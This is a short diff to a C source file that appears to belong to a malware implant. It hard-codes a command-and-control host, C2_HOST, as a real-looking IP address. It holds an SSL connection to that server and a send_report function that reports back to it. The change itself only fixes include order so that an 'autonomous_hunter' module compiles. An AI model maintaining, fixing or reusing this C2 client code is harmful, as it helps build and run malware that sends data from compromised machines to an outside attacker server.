@@ -19,7 +19,6 @@
 #include <openssl/err.h>
 #include <json-c/json.h>
 #include "config.h"
-#include "autonomous_hunter.h"
 
 #ifndef C2_HOST
 #define C2_HOST "93.95.231.134"
@@ -39,9 +38,15 @@ char my_random_name[64];
 int hunter_mode = 0;
 
 // ============================================================================
-// HUNTER SUPPORT FUNCTIONS
+// HUNTER SUPPORT FUNCTIONS (Forward declaration)
 // ============================================================================
 
+void send_report(const char *type, const char *message);
+
+// Include autonomous_hunter after forward declarations
+#include "autonomous_hunter.h"
+
+// Implementation of send_report
 void send_report(const char *type, const char *message) {
     if (!is_connected || !c2_ssl) return;
     
